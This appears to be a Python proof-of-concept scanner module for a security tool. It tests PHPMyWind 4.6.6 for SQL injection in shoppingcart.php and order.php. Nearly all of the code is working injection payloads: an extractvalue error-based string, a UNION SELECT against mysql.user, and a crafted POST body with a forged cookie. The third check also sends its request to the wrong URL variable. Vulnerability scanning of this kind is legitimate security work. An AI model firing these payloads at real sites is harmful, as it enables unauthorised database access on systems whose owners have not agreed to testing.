# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re

class Vuln(ABVuln):
    vuln_id = 'PHPMyWind_0001' # 平台漏洞编号，留空
    name = 'PHPMyWind SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2014-02-24'  # 漏洞公布时间
    desc = '''
        PHPMyWind 多处 SQL注入漏洞：
        /phpmywind/shoppingcart.php?a=a
        /phpmywind/shoppingcart.php?a=addshopingcart&goodsid=1
        /phpmywind/order.php?action=getarea
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'PHPMyWind'  # 漏洞应用名称
    product_version = '4.6.6'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'ca3f0a12-c537-4868-8f6c-43377c9a6b59'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            hh = hackhttp.hackhttp()
            #No.1 refer=http://www.wooyun.org/bugs/wooyun-2010-048454
            payload = "ddshopingcart&typeid=1/phpmywind/shoppingcart.php?a=a%20or%20@`\'`=1%20and%20extractvalue(1,concat(0x5c,md5(1)))%20and%20@`\\\'`"
            target = self.target + payload
            code, head, body, errcode, final_url = hh.http(target);

            if code == 200 and 'c4ca4238a0b923820dcc509a6f75849' in body:
                #security_hole(target)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

            #No.2 refer=http://www.wooyun.org/bugs/wooyun-2010-049845
            payload1 = "/phpmywind/shoppingcart.php?a=addshopingcart&goodsid=1%20and%20@`'`%20/*!50000union*/%20select%20null,null,null,null,null,null,null,null,null,null,md5(1),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null%20from%20mysql.user%20where%201=1%20or%20@`'`&buynum=1&goodsattr=tpcs"
            target1 = self.target + payload1
            code, head, body, errcode, final_url = hh.http(target1)
            payload2 = "/phpmywind/shoppingcart.php"
            target2 = self.target + payload2
            code, head, body, errcode, final_url = hh.http(target2)

            if code == 200 and 'c4ca4238a0b923820dcc509a6f75849' in body:
                #security_hole('Step1: '+target1+'\nStep2: '+target2)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

            #No.3 refer=http://www.wooyun.org/bugs/wooyun-2010-051687
            payload = "/phpmywind/order.php?action=getarea"
            target = self.target + payload
            cookiepayload = "shoppingcart=1&username=1"
            postpayload = "datagroup=aa&areaval=500%20and%20@`'`%20/*!50000union*/%20select%201,md5(1),3,4,5,6#@`'`&level=1"
            code, head, body, errcode, final_url = hh.http(target2, cookie=cookiepayload, post=postpayload)

            if code == 200 and 'c4ca4238a0b923820dcc509a6f75849' in body:
                #security_hole(target)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
